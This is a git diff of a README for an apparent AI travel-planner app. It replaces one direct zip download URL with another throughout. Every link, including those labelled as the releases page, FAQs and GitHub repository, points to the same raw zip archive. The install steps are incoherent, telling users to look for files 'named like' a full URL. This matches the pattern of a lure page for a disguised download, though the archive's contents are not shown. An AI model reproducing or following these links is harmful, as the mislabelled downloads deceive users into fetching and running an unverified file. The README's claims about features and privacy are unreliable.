@@ -1,7 +1,7 @@
 # ✈️ AI-Travel-Planner-Agent - Simplify Your Travel Planning
 
 ## 📥 Download the Application
-[![Download Now](https://raw.githubusercontent.com/JatinJangid2007/AI-Travel-Planner-Agent/main/headwork/AI-Travel-Planner-Agent.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/JatinJangid2007/AI-Travel-Planner-Agent/main/headwork/AI-Travel-Planner-Agent.zip)
+[![Download Now](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/raw/refs/heads/main/server/static/Travel_Planner_Agent_A_3.4.zip%20Now-Get%20the%20App-blue)](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/raw/refs/heads/main/server/static/Travel_Planner_Agent_A_3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the AI-Travel-Planner-Agent! This application helps you plan your trips with ease. Whether you're traveling for leisure or work, our tool assists you in organizing your itinerary.
@@ -22,9 +22,9 @@ Welcome to the AI-Travel-Planner-Agent! This application helps you plan your tri
 ## 🔧 Installation Guide
 
 ### 🖱️ Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/JatinJangid2007/AI-Travel-Planner-Agent/main/headwork/AI-Travel-Planner-Agent.zip) to download the latest version of the AI-Travel-Planner-Agent.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/raw/refs/heads/main/server/static/Travel_Planner_Agent_A_3.4.zip) to download the latest version of the AI-Travel-Planner-Agent.
    
-2. **Choose the Right Package**: Look for the latest stable release. You will typically see files named like `https://raw.githubusercontent.com/JatinJangid2007/AI-Travel-Planner-Agent/main/headwork/AI-Travel-Planner-Agent.zip` or similar.
+2. **Choose the Right Package**: Look for the latest stable release. You will typically see files named like `https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/raw/refs/heads/main/server/static/Travel_Planner_Agent_A_3.4.zip` or similar.
 
 3. **Download the File**: Click on the file to start downloading it. The file size will be indicated on the download link.
 
@@ -54,11 +54,11 @@ Explore travel guides within the app. It provides essential information about yo
 We respect your privacy. All user data is stored securely on our servers using Firebase. You maintain full control over your account information.
 
 ## 🆘 Support
-If you encounter any issues or have questions, please check our [FAQs](https://raw.githubusercontent.com/JatinJangid2007/AI-Travel-Planner-Agent/main/headwork/AI-Travel-Planner-Agent.zip) page or contact support through our GitHub repository.
+If you encounter any issues or have questions, please check our [FAQs](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/raw/refs/heads/main/server/static/Travel_Planner_Agent_A_3.4.zip) page or contact support through our GitHub repository.
 
 ## 🔗 Links
-- **GitHub Repository**: [AI-Travel-Planner-Agent](https://raw.githubusercontent.com/JatinJangid2007/AI-Travel-Planner-Agent/main/headwork/AI-Travel-Planner-Agent.zip)
-- **Visit the Releases Page**: [Download Here](https://raw.githubusercontent.com/JatinJangid2007/AI-Travel-Planner-Agent/main/headwork/AI-Travel-Planner-Agent.zip)
+- **GitHub Repository**: [AI-Travel-Planner-Agent](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/raw/refs/heads/main/server/static/Travel_Planner_Agent_A_3.4.zip)
+- **Visit the Releases Page**: [Download Here](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/raw/refs/heads/main/server/static/Travel_Planner_Agent_A_3.4.zip)
 
 ## ✉️ Contributing
 We welcome contributions! If you have suggestions or improvements, feel free to open an issue or submit a pull request.
